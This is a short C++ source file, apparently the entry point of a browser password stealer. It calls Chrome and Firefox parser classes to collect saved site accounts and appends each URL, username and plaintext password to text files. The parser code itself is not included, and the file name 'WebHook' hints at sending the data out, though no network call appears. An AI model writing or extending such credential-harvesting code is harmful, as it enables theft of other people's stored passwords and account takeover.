// WebHook.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "ChromeParser.h"
#include "FireFoxParser.h"

int main()
{
    std::cout << "Hello World!\n";

    ChromeParser cParser;
    List<AccountData> chromeAccounts = cParser.CollectAccounts();
    std::ofstream of("chromepasswords.txt", std::ios_base::app);
    if (of.is_open()) {
        for (const auto& data : chromeAccounts)
            of << "Url: " << data.Url << std::endl << "Username: " << data.Username << std::endl << "Password: " << data.Password << std::endl;
        of.close();
    }

    FirefoxParser cParserFire;
    List<AccountData> firefoxAccounts = cParserFire.CollectAccounts();
    std::ofstream ofFire("firefoxpasswords.txt", std::ios_base::app);
    if (ofFire.is_open()) {
        for (const auto& data : firefoxAccounts)
            ofFire << "Url: " << data.Url << std::endl << "Username: " << data.Username << std::endl << "Password: " << data.Password << std::endl;
        ofFire.close();
    }
    system("pause");
}

